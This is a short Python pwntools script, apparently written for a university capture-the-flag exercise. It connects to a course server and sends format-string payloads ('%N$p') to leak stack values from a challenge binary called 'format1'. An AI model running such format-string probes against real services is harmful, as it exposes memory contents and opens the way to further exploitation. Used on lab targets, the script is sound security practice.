from pwn import *
import struct

# exploit string
language = 0xbad
context.update(arch='amd64')

for i in range(1,16):
	with context.silent:
		p = remote('cs4401shell.walls.ninja', 9898)
		#p = process('./format1-fixed')
		p.recvline(timeout=1)
		p.recvline(timeout=1)
		# 0x55555575504c
		langcheck = b'%' + bytes(str(i), 'utf-8') + b'$p'
		p.sendline(langcheck)
		print(f'Arg{i}: {p.recvline(timeout=3)}')
